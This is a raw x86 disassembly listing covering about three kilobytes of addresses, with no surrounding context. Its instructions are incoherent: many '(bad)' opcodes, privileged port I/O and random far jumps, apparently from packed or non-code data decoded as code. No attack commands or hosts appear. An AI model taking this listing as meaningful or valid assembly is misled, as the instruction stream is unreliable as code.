  41bc17:	stc    
  41bc18:	fsub   DWORD PTR [ecx+ebx*2-0x22]
  41bc1c:	out    dx,eax
  41bc1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc1e:	xor    eax,0x93cb613a
  41bc23:	push   ebp
  41bc24:	outs   dx,DWORD PTR ds:[esi]
  41bc25:	les    ecx,FWORD PTR [eax]
  41bc27:	out    0x9d,eax
  41bc29:	loope  0x41bc02
  41bc2b:	(bad)  
  41bc2c:	(bad)  
  41bc2d:	jmp    0x310:0x7f43db8e
  41bc34:	(bad)  
  41bc35:	mov    eax,ds:0x6ad247a4
  41bc3a:	mov    ebx,0x62a31d2
  41bc3f:	das    
  41bc40:	mov    al,ds:0xcb023619
  41bc45:	test   al,0x69
  41bc47:	push   edx
  41bc48:	cmc    
  41bc49:	div    DWORD PTR [ecx]
  41bc4b:	lods   eax,DWORD PTR ds:[esi]
  41bc4c:	stos   BYTE PTR es:[edi],al
  41bc4d:	test   bh,al
  41bc4f:	adc    al,0x24
  41bc51:	and    ah,BYTE PTR [esi]
  41bc53:	in     al,0x54
  41bc55:	sub    cl,BYTE PTR [ecx-0x4aa36beb]
  41bc5b:	pusha  
  41bc5c:	ins    DWORD PTR es:[edi],dx
  41bc5d:	enter  0x4c0a,0x65
  41bc61:	jmp    0xebdfd253
  41bc66:	not    BYTE PTR [ebp+0x44]
  41bc69:	xor    eax,0xd25c97fb
  41bc6e:	mov    DWORD PTR [ecx],ebx
  41bc70:	scas   eax,DWORD PTR es:[edi]
  41bc71:	repz cld 
  41bc73:	mov    ds:0x1f71ef27,eax
  41bc78:	scas   eax,DWORD PTR es:[edi]
  41bc79:	xchg   ebx,eax
  41bc7a:	imul   esp,DWORD PTR [edi+0x1e],0xf7cabcaf
  41bc81:	rcr    DWORD PTR [ebp+0x50bc3689],0xb3
  41bc88:	jg     0x41bc8b
  41bc8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc8b:	push   ss
  41bc8c:	in     eax,dx
  41bc8d:	enter  0x246e,0xb7
  41bc91:	jno    0x41bc65
  41bc93:	shl    BYTE PTR [edx],cl
  41bc95:	push   ss
  41bc96:	cdq    
  41bc97:	sub    BYTE PTR [edi+0x41],dh
  41bc9a:	arpl   WORD PTR [esi+0x24],sp
  41bc9d:	pop    ecx
  41bc9e:	sbb    ah,0x57
  41bca1:	test   BYTE PTR [edi+0xc30019a],0x1
  41bca8:	and    al,0xeb
  41bcaa:	hlt    
  41bcab:	adc    edx,DWORD PTR [eax+0x65f54cce]
  41bcb1:	gs mov esp,0x6c80b8d8
  41bcb7:	mov    ebp,0x29f3e33f
  41bcbc:	sbb    edi,DWORD PTR [eax+0x4]
  41bcbf:	std    
  41bcc0:	add    DWORD PTR [ebx-0x3c],eax
  41bcc3:	sti    
  41bcc4:	mov    ebx,fs
  41bcc6:	cwde   
  41bcc7:	sbb    al,0xce
  41bcc9:	adc    DWORD PTR [eax+0x60d78704],0x46
  41bcd0:	mov    bl,0x2d
  41bcd2:	dec    ecx
  41bcd3:	retw   
  41bcd5:	and    BYTE PTR [edi],ch
  41bcd7:	je     0x41bcd7
  41bcd9:	repnz mov ebx,0x8a49638d
  41bcdf:	mov    ds:0xc0b1de41,al
  41bce4:	mov    DWORD PTR [eax+0x32],edi
  41bce7:	mov    eax,ds:0xa3989233
  41bcec:	mov    ecx,DWORD PTR [ecx+0x41]
  41bcef:	lds    eax,FWORD PTR [ebp-0x16]
  41bcf2:	inc    eax
  41bcf3:	pop    es
  41bcf4:	adc    al,0x26
  41bcf6:	xchg   DWORD PTR [ebx+0x365eecce],ecx
  41bcfc:	js     0x41bd00
  41bcfe:	mov    ah,0x67
  41bd00:	clc    
  41bd01:	cmp    al,0xfe
  41bd03:	loopne 0x41bd51
  41bd05:	out    dx,al
  41bd06:	(bad)  
  41bd07:	popf   
  41bd08:	lahf   
  41bd09:	call   DWORD PTR [edi]
  41bd0b:	pop    ebp
  41bd0c:	sbb    DWORD PTR [edi],esp
  41bd0e:	out    0xa3,al
  41bd10:	mov    ecx,0x1c1790d9
  41bd15:	inc    ecx
  41bd16:	mov    ecx,0x84eb0459
  41bd1b:	mov    bh,0x1c
  41bd1d:	mov    bl,0x62
  41bd1f:	cld    
  41bd20:	lods   eax,DWORD PTR ds:[esi]
  41bd21:	or     al,0x17
  41bd23:	adc    ebp,esp
  41bd25:	pushf  
  41bd26:	in     al,dx
  41bd27:	ja     0x41bd6b
  41bd29:	sbb    DWORD PTR [ebp-0x1e],eax
  41bd2c:	int3   
  41bd2d:	push   es
  41bd2e:	mov    bh,0x7b
  41bd30:	les    ebx,FWORD PTR [eax]
  41bd32:	or     DWORD PTR [bx+di],ecx
  41bd35:	in     eax,dx
  41bd36:	dec    ebx
  41bd37:	int3   
  41bd38:	aaa    
  41bd39:	xor    bh,bh
  41bd3b:	ins    BYTE PTR es:[edi],dx
  41bd3c:	in     al,0xba
  41bd3e:	and    eax,0x89672dc2
  41bd43:	pop    edx
  41bd44:	loope  0x41bd47
  41bd46:	jp     0x41bd4f
  41bd48:	call   0xa6975f9b
  41bd4d:	xchg   BYTE PTR [edi-0x1e],bl
  41bd50:	lock cmp al,0x95
  41bd53:	xor    edi,ebp
  41bd55:	sbb    ebx,0x913ea71d
  41bd5b:	lahf   
  41bd5c:	jp     0x41bd68
  41bd5e:	mov    dh,0x10
  41bd60:	inc    edi
  41bd61:	xchg   ecx,eax
  41bd62:	xchg   esi,eax
  41bd63:	sbb    al,0x96
  41bd65:	cmp    BYTE PTR [ecx],al
  41bd67:	(bad)  
  41bd68:	xor    eax,0xa873835d
  41bd6d:	aam    0xe7
  41bd6f:	dec    esp
  41bd70:	ret    
  41bd71:	add    BYTE PTR [ebp+0x29],0x90
  41bd75:	popf   
  41bd76:	mov    DWORD PTR [esi],ebp
  41bd78:	push   ecx
  41bd79:	push   0xffffffcc
  41bd7b:	mov    esi,0xdb1661e5
  41bd80:	jp     0x41bdee
  41bd82:	push   eax
  41bd83:	jb     0x41bd6f
  41bd85:	mov    ds:0x797b159a,eax
  41bd8a:	jmp    0x41bda8
  41bd8c:	std    
  41bd8d:	sub    BYTE PTR [ebp-0x1a],bl
  41bd90:	repz xor BYTE PTR [eax],al
  41bd93:	in     eax,0x8c
  41bd95:	sbb    BYTE PTR [ecx],0xc4
  41bd98:	ror    DWORD PTR [esp+eax*4],1
  41bd9b:	icebp  
  41bd9c:	sahf   
  41bd9d:	mov    cl,0xc7
  41bd9f:	imul   esp,DWORD PTR ds:0x8aeef54f,0x73bc7ab7
  41bda9:	loope  0x41be04
  41bdab:	pop    ds
  41bdac:	loope  0x41bda2
  41bdae:	sar    dl,cl
  41bdb0:	(bad)  
  41bdb1:	mov    ecx,0xe93b44c5
  41bdb6:	scas   al,BYTE PTR es:[edi]
  41bdb7:	test   DWORD PTR [edx-0xed840e],ebx
  41bdbd:	pop    eax
  41bdbe:	pop    es
  41bdbf:	daa    
  41bdc0:	inc    esi
  41bdc1:	ret    
  41bdc2:	mov    ebx,0xd7394315
  41bdc7:	xchg   esi,eax
  41bdc8:	out    0xba,al
  41bdca:	dec    edi
  41bdcb:	pushf  
  41bdcc:	inc    edi
  41bdcd:	cmc    
  41bdce:	pop    ebx
  41bdcf:	sub    esi,DWORD PTR [edi-0x60]
  41bdd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdd3:	mov    cl,0x42
  41bdd5:	and    al,0xd0
  41bdd7:	or     dh,BYTE PTR [edi-0x52ae6ebd]
  41bddd:	sbb    DWORD PTR [edx],esi
  41bddf:	jns    0x41be3d
  41bde1:	popa   
  41bde2:	(bad)  
  41bde3:	pop    es
  41bde4:	adc    eax,0x1529364d
  41bde9:	lock dec esp
  41bdeb:	inc    ebp
  41bdec:	stos   DWORD PTR es:[edi],eax
  41bded:	inc    edi
  41bdee:	push   cs
  41bdef:	jo     0x41bda4
  41bdf1:	mov    esp,0xc89dbb71
  41bdf6:	stos   DWORD PTR es:[edi],eax
  41bdf7:	mov    ecx,0xd00577a3
  41bdfc:	add    BYTE PTR [ecx-0x7a8fc52b],al
  41be02:	(bad)  
  41be03:	iret   
  41be04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be05:	xchg   edi,eax
  41be06:	pop    ds
  41be07:	imul   ecx,DWORD PTR [ebx+eiz*2],0x555ccb28
  41be0e:	xor    eax,0xdecc3a18
  41be13:	mov    ds:0x9c72d98b,al
  41be18:	les    ecx,FWORD PTR [ecx]
  41be1a:	sbb    DWORD PTR [ebx],eax
  41be1c:	aam    0x52
  41be1e:	ss dec ecx
  41be20:	iret   
  41be21:	add    cl,BYTE PTR [ebp+0x2a0d69a9]
  41be27:	add    eax,0x4f1bf2bf
  41be2c:	sub    BYTE PTR [eax],cl
  41be2e:	fiadd  DWORD PTR [edi]
  41be30:	popf   
  41be31:	jp     0x41be23
  41be33:	out    0x4f,eax
  41be35:	mov    esp,0x54ed5949
  41be3a:	sahf   
  41be3b:	mov    bl,ah
  41be3d:	aas    
  41be3e:	or     ebx,ebp
  41be40:	mov    edi,DWORD PTR [esi]
  41be42:	jo     0x41be72
  41be44:	outs   dx,DWORD PTR ds:[esi]
  41be45:	mov    bh,0xc2
  41be47:	retf   0xf991
  41be4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be4b:	push   esi
  41be4c:	mov    ebx,0x78187e9f
  41be51:	jne    0x41be37
  41be53:	imul   esi,DWORD PTR [eax+eiz*8],0x7d
  41be57:	inc    esi
  41be58:	ret    0x29c7
  41be5b:	sahf   
  41be5c:	pop    ecx
  41be5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be5e:	jle    0x41be18
  41be60:	in     al,dx
  41be61:	push   0x28
  41be63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be64:	lock dec esp
  41be66:	xor    ch,cl
  41be68:	lods   al,BYTE PTR ds:[esi]
  41be69:	xor    BYTE PTR [ebx-0x4b91525a],al
  41be6f:	sbb    bl,dh
  41be71:	lods   eax,DWORD PTR ds:[esi]
  41be72:	retf   0xf834
  41be75:	and    eax,0x3cd95883
  41be7a:	inc    esi
  41be7b:	push   ds
  41be7c:	js     0x41be51
  41be7e:	mov    bl,0x2f
  41be80:	aam    0xa6
  41be82:	dec    esp
  41be83:	push   0xfffffff2
  41be85:	and    ebp,DWORD PTR [esi-0x60]
  41be88:	jmp    0x41bee4
  41be8a:	add    eax,0x5e85c4a4
  41be8f:	(bad)
  41be92:	pop    edi
  41be93:	push   ss
  41be94:	loop   0x41becc
  41be96:	daa    
  41be97:	pop    es
  41be98:	je     0x41bea1
  41be9a:	add    al,0x18
  41be9c:	dec    eax
  41be9d:	fcomi  st,st(6)
  41be9f:	rcr    edx,1
  41bea1:	addr16 jo 0x41be58
  41bea4:	push   esi
  41bea5:	pop    edi
  41bea6:	sbb    eax,0x987fb621
  41beab:	outs   dx,DWORD PTR ds:[esi]
  41beac:	jp     0x41bf26
  41beae:	cli    
  41beaf:	daa    
  41beb0:	lock mov ds:0x5d66c82,al
  41beb6:	sub    al,0xa8
  41beb8:	pushw  ss
  41beba:	jl     0x41be5a
  41bebc:	inc    esp
  41bebd:	cmp    esi,0x4e
  41bec0:	(bad)  
  41bec1:	cmp    al,0xc7
  41bec3:	xor    BYTE PTR [edi],dl
  41bec5:	and    eax,0x822a7a7d
  41beca:	mov    esi,0x43ae24a6
  41becf:	sub    DWORD PTR [ebx],0x53b37696
  41bed5:	gs jnp 0x41bf45
  41bed8:	fisttp DWORD PTR [ebx+0x2c0d1d91]
  41bede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bedf:	cdq    
  41bee0:	pop    eax
  41bee1:	cs dec esp
  41bee3:	xchg   DWORD PTR [ecx],esi
  41bee5:	dec    esi
  41bee6:	stos   BYTE PTR es:[edi],al
  41bee7:	mov    edx,0x8595cb22
  41beec:	sbb    BYTE PTR [ebp+0x15],al
  41beef:	aaa    
  41bef0:	fld    DWORD PTR [edi+0x2a088f5]
  41bef6:	xor    DWORD PTR [edi+edi*2],edx
  41bef9:	pop    esi
  41befa:	fwait
  41befb:	mov    edx,0x42d8875f
  41bf00:	pushf  
  41bf01:	sar    BYTE PTR [ebx],1
  41bf03:	dec    ebx
  41bf04:	sub    al,0x27
  41bf06:	adc    BYTE PTR ds:0x6c8f96c2,ah
  41bf0c:	fiadd  DWORD PTR [esp+ebp*2+0x765d0d6a]
  41bf13:	inc    eax
  41bf14:	mov    esi,0xa4e2cfe5
  41bf19:	pop    esi
  41bf1a:	push   ebx
  41bf1b:	aam    0xcc
  41bf1d:	xor    DWORD PTR [edx+0x7f29d10e],edx
  41bf23:	pusha  
  41bf24:	push   esp
  41bf25:	and    eax,esi
  41bf27:	mov    edi,DWORD PTR [esi+eax*4+0x33b26dd]
  41bf2e:	jg     0x41bf67
  41bf30:	push   DWORD PTR [eax+0x33161c13]
  41bf36:	(bad)  
  41bf37:	xchg   ebx,eax
  41bf38:	jo     0x41bf7e
  41bf3a:	rcl    BYTE PTR [ebx+0x79d5d859],cl
  41bf40:	mov    ebp,0x1b7d224a
  41bf45:	jmp    0xc8ce20fb
  41bf4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf4b:	aas    
  41bf4c:	cmp    DWORD PTR [edi],esi
  41bf4e:	or     esi,DWORD PTR [edi+0x569d8dc0]
  41bf54:	dec    edx
  41bf55:	inc    edi
  41bf56:	mov    dl,0xa4
  41bf58:	xchg   ecx,eax
  41bf59:	pusha  
  41bf5a:	xlat   BYTE PTR ds:[ebx]
  41bf5b:	sub    edi,DWORD PTR [edx-0x166c831e]
  41bf61:	rcr    BYTE PTR [esi-0x66fed778],cl
  41bf67:	inc    eax
  41bf68:	cmp    al,0xc
  41bf6a:	push   eax
  41bf6b:	popa   
  41bf6c:	pop    ss
  41bf6d:	push   eax
  41bf6e:	imul   ebp,DWORD PTR [esi+0x7b],0x11088a1f
  41bf75:	js     0x41bf1a
  41bf77:	fldcw  WORD PTR [eax-0x70]
  41bf7a:	lea    ebx,[ebx+0x52001319]
  41bf80:	inc    ecx
  41bf81:	mov    bh,0x1a
  41bf83:	add    DWORD PTR [ebx+0x5eec066e],eax
  41bf89:	cmp    al,cl
  41bf8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf8c:	push   edx
  41bf8d:	inc    esi
  41bf8e:	push   eax
  41bf8f:	fldenv [edx+ecx*2-0x3e4bc8d3]
  41bf96:	xor    DWORD PTR [eax+eiz*4-0x1e],eax
  41bf9a:	inc    ebx
  41bf9b:	jmp    0x41bf7f
  41bf9d:	shr    BYTE PTR [ebx-0x28],0xdb
  41bfa1:	jne    0x41bf3c
  41bfa3:	jg     0x41bf64
  41bfa5:	(bad)  
  41bfa8:	mov    edi,0x96fedd7a
  41bfad:	cmc    
  41bfae:	push   edx
  41bfaf:	dec    esi
  41bfb0:	pusha  
  41bfb1:	fild   WORD PTR [ebp+esi*1+0x66ac7f21]
  41bfb8:	mov    ah,0x2d
  41bfba:	fmul   QWORD PTR [edi-0x57]
  41bfbd:	(bad)  
  41bfbe:	xor    al,0xe8
  41bfc0:	(bad)  
  41bfc1:	sti    
  41bfc2:	ret    0x780
  41bfc5:	mov    ebx,0x203ab734
  41bfca:	sbb    al,0xf1
  41bfcc:	xor    DWORD PTR [ecx],eax
  41bfce:	les    esi,FWORD PTR [eax+0x17]
  41bfd1:	adc    eax,0x7e4be279
  41bfd6:	loopne 0x41bffd
  41bfd8:	(bad)  
  41bfd9:	arpl   WORD PTR [ebx],dx
  41bfdb:	cdq    
  41bfdc:	sbb    al,0x71
  41bfde:	inc    edi
  41bfdf:	mov    eax,ds:0x34f4d837
  41bfe4:	test   eax,0x32545a7d
  41bfe9:	sbb    cl,BYTE PTR [edi]
  41bfeb:	pop    ds
  41bfec:	jae    0x41c04c
  41bfee:	adc    eax,0xdbbb222f
  41bff3:	inc    edi
  41bff4:	clts   
  41bff6:	and    BYTE PTR [ebx-0x6c96dfd1],bh
  41bffc:	xchg   esp,eax
  41bffd:	sbb    cl,BYTE PTR [ebx+esi*2-0x6e]
  41c001:	inc    ebx
  41c002:	add    ebp,DWORD PTR [ecx+0x5c]
  41c005:	out    dx,eax
  41c006:	xor    BYTE PTR [esi],0xca
  41c009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c00a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c00b:	jp     0x41c064
  41c00d:	push   0xeeadfd9d
  41c012:	cmp    dh,BYTE PTR [edi-0x31]
  41c015:	lock jb 0x41bfd7
  41c018:	sbb    ch,bl
  41c01a:	jo     0x41c062
  41c01c:	fs mov dh,0xbb
  41c01f:	test   bh,0xe8
  41c022:	push   edi
  41c023:	fs or  eax,0xd6d122ce
  41c029:	les    ebp,FWORD PTR [ecx+0x33d4f9ee]
  41c02f:	std    
  41c030:	or     bh,al
  41c032:	sub    DWORD PTR [edi-0x3c],0xffffffcb
  41c036:	mov    ch,BYTE PTR [edi+0x5dbfbd94]
  41c03c:	sbb    eax,DWORD PTR [edi+0x48389321]
  41c042:	daa    
  41c043:	ss retf 
  41c045:	xchg   al,bh
  41c047:	cmp    al,0x76
  41c049:	rcl    BYTE PTR [edx-0xf4f2638],1
  41c04f:	add    eax,DWORD PTR [edx-0x2193591f]
  41c055:	in     al,dx
  41c056:	ins    DWORD PTR es:[edi],dx
  41c057:	xchg   edx,eax
  41c058:	retf   0x433
  41c05b:	ror    DWORD PTR [ebp+0x13],cl
  41c05e:	pop    edi
  41c05f:	mov    bh,0xfe
  41c061:	das    
  41c062:	xchg   DWORD PTR gs:[edx+esi*4],eax
  41c066:	sbb    BYTE PTR [ebp+0x619a8ae7],ch
  41c06c:	pop    ebp
  41c06d:	ja     0x41c068
  41c06f:	push   es
  41c070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c071:	sbb    bl,BYTE PTR [eiz*8+0x12455c42]
  41c078:	out    dx,al
  41c079:	jecxz  0x41c00f
  41c07b:	xchg   BYTE PTR [esi+edx*2-0x6ff482bd],ah
  41c082:	cli    
  41c083:	xor    DWORD PTR [edi-0x2909efc1],edi
  41c089:	repnz mov ?,WORD PTR [ecx+0x7120fc6b]
  41c090:	ins    DWORD PTR es:[edi],dx
  41c091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c092:	call   0xd856bc4f
  41c097:	les    esp,FWORD PTR [edx]
  41c099:	(bad)  
  41c09a:	mov    ds:0x92d6e001,al
  41c09f:	inc    edx
  41c0a0:	xchg   ebp,eax
  41c0a1:	mov    cl,BYTE PTR [eax+0x73]
  41c0a4:	retf   0xa2e6
  41c0a7:	add    DWORD PTR [edx+0x3d],edx
  41c0aa:	imul   edi,esi,0xffffff99
  41c0ad:	ret    0x33fd
  41c0b0:	mov    ecx,0xcd8d9b45
  41c0b5:	lds    edi,FWORD PTR ss:[ecx-0x30]
  41c0b9:	adc    BYTE PTR [edi],dl
  41c0bb:	enter  0x8498,0x23
  41c0bf:	jmp    0x7c5:0x42f0ae35
  41c0c6:	xchg   DWORD PTR [ecx+0x6e11c201],ebx
  41c0cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0cd:	cmp    eax,edx
  41c0cf:	loope  0x41c0ca
  41c0d1:	rcl    BYTE PTR [edx],cl
  41c0d3:	ds add eax,0xb129aa4a
  41c0d9:	call   0x6101:0xb5620c32
  41c0e0:	pop    esp
  41c0e1:	sub    al,BYTE PTR [ebx+0x6]
  41c0e4:	(bad)  
  41c0e5:	orps   xmm5,XMMWORD PTR [eax+eax*4+0x6a]
  41c0ea:	lods   eax,DWORD PTR ds:[esi]
  41c0eb:	or     BYTE PTR [edx-0x5d],al
  41c0ee:	pop    es
  41c0ef:	and    ah,bl
  41c0f1:	xchg   esp,eax
  41c0f2:	cmp    esp,edi
  41c0f4:	mov    ds:0xdc9dc9d1,eax
  41c0f9:	cmp    DWORD PTR [ebp+ebx*1-0x47cadada],edi
  41c100:	dec    esi
  41c101:	xchg   esi,eax
  41c102:	mov    esp,0x2af4ab4a
  41c107:	pop    edx
  41c108:	pop    ds
  41c109:	or     BYTE PTR ds:0x3f41023c,0xef
  41c110:	pushf  
  41c111:	dec    esp
  41c112:	mov    bl,0xcc
  41c114:	cld    
  41c115:	sahf   
  41c116:	cmp    DWORD PTR [edi+0x374cd273],esi
  41c11c:	pop    ss
  41c11d:	push   cs
  41c11e:	jle    0x41c0ec
  41c120:	sbb    BYTE PTR [eax+0x20b9053d],al
  41c126:	int    0x66
  41c128:	mov    ecx,0x7381683b
  41c12d:	mov    DWORD PTR [eax-0x5180d49f],ebp
  41c133:	test   ecx,esp
  41c135:	mov    edx,0x9807990f
  41c13a:	adc    eax,0xdfe3bb00
  41c13f:	fsubrp st(5),st
  41c141:	bound  edx,QWORD PTR gs:[ebp-0x5beddee8]
  41c148:	jne    0x41c0e5
  41c14a:	pop    ebp
  41c14b:	inc    esp
  41c14c:	xchg   ebp,eax
  41c14d:	sub    al,al
  41c14f:	pop    ecx
  41c150:	scas   al,BYTE PTR es:[edi]
  41c151:	dec    esp
  41c152:	sbb    eax,0x53765148
  41c157:	pusha  
  41c158:	leave  
  41c159:	dec    edi
  41c15a:	jge    0x41c0e4
  41c15c:	xor    BYTE PTR [ebx+0x635a7b13],al
  41c162:	test   eax,0x355e57a0
  41c167:	sbb    DWORD PTR [edx-0x14],0xa545424
  41c16e:	jmp    0x505c:0xff57fab8
  41c175:	xchg   ebp,eax
  41c176:	fisub  WORD PTR [esi]
  41c178:	jecxz  0x41c1c3
  41c17a:	retf   0xc021
  41c17d:	push   ebx
  41c17e:	lods   al,BYTE PTR ds:[esi]
  41c17f:	xchg   edi,eax
  41c180:	xor    al,0xe6
  41c182:	cmp    BYTE PTR [edi],0x57
  41c185:	fs loopne 0x41c1a4
  41c188:	push   cs
  41c189:	dec    ebp
  41c18b:	sbb    BYTE PTR [edx+ebx*8],0xd8
  41c18f:	enter  0x68ae,0x2d
  41c193:	sbb    ch,BYTE PTR [eax+eiz*1+0x678e176b]
  41c19a:	cwde   
  41c19b:	fwait
  41c19c:	cmp    eax,0x70f66883
  41c1a1:	add    BYTE PTR [edx],dl
  41c1a3:	data16 ja 0x41c17a
  41c1a6:	daa    
  41c1a7:	push   ebx
  41c1a8:	imul   ecx,DWORD PTR gs:[ebx-0x4c53a9c],0x5e
  41c1b0:	aaa    
  41c1b1:	sti    
  41c1b2:	and    eax,0x6841db1
  41c1b7:	push   es
  41c1b8:	je     0x41c158
  41c1ba:	aas    
  41c1bb:	loope  0x41c18e
  41c1bd:	into   
  41c1be:	inc    esp
  41c1bf:	aad    0x8f
  41c1c1:	arpl   WORD PTR [edi+edi*1],dx
  41c1c4:	push   ds
  41c1c5:	mov    BYTE PTR [edi],0xc3
  41c1c8:	push   cs
  41c1c9:	or     al,0x80
  41c1cb:	xchg   esp,eax
  41c1cc:	jle    0x41c175
  41c1ce:	add    al,BYTE PTR [ebx]
  41c1d0:	call   0x7b74:0x1222e906
  41c1d7:	aas    
  41c1d8:	call   0x3d13882b
  41c1dd:	sub    BYTE PTR [ebp+0x14],ah
  41c1e0:	out    dx,eax
  41c1e1:	arpl   di,cx
  41c1e3:	imul   eax,DWORD PTR [ebp+0x55],0x59e46c83
  41c1ea:	push   ebx
  41c1eb:	aaa    
  41c1ec:	pop    es
  41c1ed:	xor    al,0x11
  41c1ef:	inc    eax
  41c1f0:	xor    BYTE PTR [edx+0x74],dh
  41c1f3:	push   ss
  41c1f4:	bound  ebp,QWORD PTR [edi]
  41c1f6:	sub    al,0xe5
  41c1f8:	jb     0x41c1fc
  41c1fa:	inc    ecx
  41c1fb:	nop
  41c1fc:	pop    ebx
  41c1fd:	xchg   edi,eax
  41c1fe:	mov    eax,0xab0e983
  41c203:	cmp    ebx,ebp
  41c205:	(bad)
  41c208:	add    DWORD PTR [bp+di],0x7
  41c20c:	dec    ebx
  41c20d:	dec    edx
  41c20e:	push   es
  41c20f:	inc    edi
  41c210:	shr    DWORD PTR [ecx-0xa],0xac
  41c214:	icebp  
  41c215:	mov    ah,0x47
  41c217:	pop    edi
  41c218:	(bad)
  41c21c:	push   ecx
  41c21d:	inc    ebx
  41c21e:	repnz add eax,0xe63ab979
  41c224:	loop   0x41c283
  41c226:	mov    fs,WORD PTR [esi]
  41c228:	js     0x41c26e
  41c22a:	ret    
  41c22b:	add    DWORD PTR [ebx-0xf028941],esp
  41c231:	push   ebx
  41c232:	adc    BYTE PTR [eax-0x22e13cb7],ch
  41c238:	mov    ds:0xfdc5991e,eax
  41c23d:	dec    BYTE PTR ds:0x555d71ef
  41c243:	dec    esp
  41c244:	mov    ds:0xd3323f1c,eax
  41c249:	mov    esi,0x6c71a4
  41c24e:	and    al,0xec
  41c250:	enter  0x4c40,0x31
  41c254:	jo     0x41c207
  41c256:	aas    
  41c257:	push   cs
  41c258:	mov    al,ds:0xe827b45e
  41c25d:	pop    ecx
  41c25e:	inc    eax
  41c25f:	push   ss
  41c260:	and    al,0x39
  41c262:	fnsave [ebx-0x20]
  41c265:	test   al,0x5
  41c267:	xchg   ebp,eax
  41c268:	out    0x5e,al
  41c26a:	sbb    bl,bh
  41c26c:	cmp    DWORD PTR [ecx],esi
  41c26e:	jae    0x41c232
  41c270:	fstp   QWORD PTR cs:[esi-0x7f]
  41c274:	adc    al,0x7
  41c276:	jnp    0x41c250
  41c278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c279:	test   DWORD PTR [ecx-0x67c4bcc8],ecx
  41c27f:	addr16 test al,0x98
  41c282:	ins    DWORD PTR es:[edi],dx
  41c283:	mov    ah,0xc
  41c285:	jmp    0xb521:0xa5f2d898
  41c28c:	sub    edi,ebp
  41c28e:	xchg   ecx,eax
  41c28f:	loop   0x41c236
  41c291:	jb     0x41c2d7
  41c293:	frstor [edx]
  41c295:	jnp    0x41c2f5
  41c297:	push   0x62c5c03f
  41c29c:	sub    al,0x69
  41c29e:	(bad)  
  41c29f:	lods   eax,DWORD PTR ds:[esi]
  41c2a0:	xor    eax,0xbf92d4d0
  41c2a5:	or     al,BYTE PTR [edx]
  41c2a7:	mov    ch,0xd6
  41c2a9:	cld    
  41c2aa:	jnp    0x41c24b
  41c2ac:	adc    DWORD PTR [edx],edx
  41c2ae:	rcr    DWORD PTR [eax],0x41
  41c2b1:	pop    DWORD PTR [esi]
  41c2b3:	mov    al,ds:0x3c86840b
  41c2b8:	(bad)  
  41c2b9:	sub    al,0x44
  41c2bb:	lods   eax,DWORD PTR ds:[esi]
  41c2bc:	fsubp  st(1),st
  41c2be:	jmp    0x41c258
  41c2c0:	mov    WORD PTR [edx+0x55],?
  41c2c3:	add    BYTE PTR [edi],dl
  41c2c5:	dec    eax
  41c2c6:	mov    ecx,edx
  41c2c8:	mov    al,ds:0x8e93970b
  41c2cd:	sub    bh,BYTE PTR [ecx+0x61]
  41c2d0:	and    DWORD PTR [ecx],esp
  41c2d2:	mov    ah,0x49
  41c2d4:	jo     0x41c262
  41c2d6:	inc    ebp
  41c2d7:	dec    esi
  41c2d8:	inc    edi
  41c2d9:	in     eax,0xc1
  41c2db:	mov    ah,0x2
  41c2dd:	lods   eax,DWORD PTR ds:[esi]
  41c2de:	loopne 0x41c351
  41c2e0:	xor    cl,cl
  41c2e2:	cwde   
  41c2e3:	scas   eax,DWORD PTR es:[edi]
  41c2e4:	es leave 
  41c2e6:	adc    al,0xe0
  41c2e8:	(bad)  
  41c2e9:	in     eax,dx
  41c2ea:	repnz in al,0x68
  41c2ed:	dec    esi
  41c2ee:	xchg   edx,eax
  41c2ef:	cwde   
  41c2f0:	mov    ebx,0x797bdf59
  41c2f5:	add    DWORD PTR [edi],edx
  41c2f7:	stc    
  41c2f8:	push   0xffffffbf
  41c2fa:	gs aad 0x49
  41c2fd:	xchg   ebx,eax
  41c2fe:	add    BYTE PTR [ecx-0x219d591],ah
  41c304:	loop   0x41c313
  41c306:	das    
  41c307:	shl    BYTE PTR [ebx+0x58],cl
  41c30a:	adc    eax,0xe14bb1a8
  41c30f:	cwde   
  41c310:	add    DWORD PTR [ecx-0x68],0x11
  41c314:	xchg   edx,eax
  41c315:	ins    DWORD PTR es:[edi],dx
  41c316:	sub    al,0x49
  41c318:	mov    al,0x4a
  41c31a:	retf   0x6024
  41c31d:	jecxz  0x41c321
  41c31f:	dec    ebp
  41c320:	ja     0x41c2a8
  41c322:	sbb    eax,0x9fbc555b
  41c327:	dec    edi
  41c328:	push   ss
  41c329:	xor    BYTE PTR [esi],ah
  41c32b:	jno    0x41c2d2
  41c32d:	pop    eax
  41c32e:	add    BYTE PTR [esi+0x32a19858],bh
  41c334:	or     esi,DWORD PTR [ecx+ecx*8-0x2a]
  41c338:	mov    ds:0xf586aaae,al
  41c33d:	imul   edx,esp,0x26f9128f
  41c343:	add    DWORD PTR ds:0xbeb7e863,ebp
  41c349:	cs int3 
  41c34b:	add    al,0x58
  41c34d:	pop    edx
  41c34e:	stos   DWORD PTR es:[edi],eax
  41c34f:	cmp    ecx,DWORD PTR [ecx+0x6a]
  41c352:	push   0xffffffd2
  41c354:	push   0xca5c0e43
  41c359:	dec    ebp
  41c35a:	sahf   
  41c35b:	jb     0x41c330
  41c35d:	test   al,0x9c
  41c35f:	push   edi
  41c360:	cli    
  41c361:	add    ecx,esi
  41c363:	call   0x1f2:0x297d8655
  41c36a:	adc    ecx,0xffffffd8
  41c36d:	popa   
  41c36e:	fimul  WORD PTR [ebx-0x56]
  41c371:	out    dx,al
  41c372:	sbb    edx,DWORD PTR [esi+ebx*4]
